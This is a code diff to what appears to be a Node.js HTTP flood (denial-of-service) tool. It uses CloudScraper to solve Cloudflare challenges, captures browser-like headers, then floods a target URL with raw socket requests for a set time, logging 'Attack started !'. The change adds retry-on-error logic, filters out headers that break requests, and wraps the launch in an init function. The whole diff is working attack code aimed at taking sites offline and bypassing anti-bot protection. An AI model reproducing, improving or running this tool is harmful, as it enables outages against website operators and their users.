@@ -15,24 +15,32 @@ const target = process.argv[2],
     req_per_ip = process.argv[4],
     host = url.parse(target).host;
 
-let getHeaders = new Promise(function (resolve, reject) {
-    CloudScraper.get({
-        uri: target,
-        resolveWithFullResponse: true,
-        challengesToSolve: 10
-    }, function (error, response) {
-        if (error) {
-            return console.log(error.message);
-        }
-        let headers = '';
-        Object.keys(response.request.headers).forEach(function (i, e) {
-            headers += i + ': ' + response.request.headers[i] + '\r\n';
-        });
+let getHeaders = function () {
+    return new Promise(function (resolve, reject) {
+        CloudScraper.get({
+            uri: target,
+            resolveWithFullResponse: true,
+            challengesToSolve: 1
+        }, function (error, response) {
+            if (error) {
+                //If cloudscraper return an error will retry
+                console.log(`ERROR: ${error.message}, retrying the request.`);
+                return start();
+            }
+            let headers = '';
+            Object.keys(response.request.headers).forEach(function (i, e) {
+                //The following headers might break the request
+                if (['content-length', 'Upgrade-Insecure-Requests', 'Accept-Encoding'].includes(i)) {
+                    return;
+                }
+                headers += i + ': ' + response.request.headers[i] + '\r\n';
+            });
 
-        console.log(headers);
-        resolve(headers);
+            console.log(headers);
+            resolve(headers);
+        });
     });
-});
+}
 
 function send_req(headers) {
     const net = require('net'),
@@ -56,17 +64,21 @@ function send_req(headers) {
     });
 }
 
-getHeaders.then(function (result) {
-    console.log('Attack started !');
-    setInterval(() => {
-        send_req(result);
+let init = function () {
+    getHeaders().then(function (result) {
+        console.log('Attack started !');
+        setInterval(() => {
+            send_req(result);
+        });
     });
-});
+};
 
 setTimeout(() => {
     console.log('Attack ended.');
     process.exit(0)
 }, time * 1000);
+
+init();
 
 // to avoid errors
 process.on('uncaughtException', function (err) {
